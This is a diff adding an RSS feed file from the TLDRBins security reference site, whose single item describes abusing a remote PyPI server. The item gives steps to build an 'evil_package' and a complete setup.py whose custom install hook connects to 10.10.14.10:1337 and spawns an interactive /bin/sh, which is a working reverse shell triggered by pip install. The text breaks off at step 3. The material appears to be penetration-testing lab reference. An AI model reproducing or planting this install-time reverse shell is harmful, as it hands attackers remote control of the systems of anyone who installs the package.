@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Package on TLDRBins</title>
+    <link>https://tldrbins.github.io/@package/</link>
+    <description>Recent content in Package on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@package/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pypi</title>
+      <link>https://tldrbins.github.io/pypi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pypi/</guid>
+      <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@example.com&amp;#34;, url=&amp;#34;http://example.com&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
+    </item>
+  </channel>
+</rss>
